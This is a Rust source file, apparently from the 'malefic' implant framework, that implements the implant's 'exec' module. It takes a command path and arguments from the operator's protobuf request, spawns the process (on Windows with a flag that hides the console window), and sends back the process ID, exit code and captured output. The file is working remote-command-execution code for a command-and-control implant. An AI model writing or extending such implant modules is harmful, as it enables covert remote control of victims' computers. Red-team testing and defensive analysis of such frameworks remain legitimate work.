use crate::{Module, TaskResult, check_request};
use malefic_helper::protobuf::implantpb::{ExecRequest, ExecResponse};
use malefic_helper::protobuf::implantpb::spite::Body;

use std::process::{Command, Stdio};
use async_trait::async_trait;
use malefic_trait::module_impl;
use std::process::Child;

pub struct Exec {}

fn run_command(request: ExecRequest) -> std::result::Result<std::process::Child, std::io::Error> {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        Command::new(request.path)
                .creation_flags(0x08000000)
                .args(request.args)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
    }
    #[cfg(target_family = "unix")]
    {
        Command::new(request.path)
                .args(request.args)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
    }
}

#[async_trait]
#[module_impl("exec")]
impl Module for Exec {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> crate::Result {
        let request = check_request!(receiver, Body::ExecRequest)?;
        let is_output = request.output;

        let mut exec_response = ExecResponse::default();
        
        let child = run_command(request)?;

        exec_response.pid = child.id();
        let output = child.wait_with_output()?;

        let status_code = output.status.code().unwrap_or(0);
        exec_response.status_code = status_code;
        exec_response.stdout = if is_output { output.stdout } else { Vec::new()};
        exec_response.stderr = if is_output { output.stderr } else { Vec::new()};

        Ok(TaskResult::new_with_body(id, Body::ExecResponse(exec_response)))
    }
}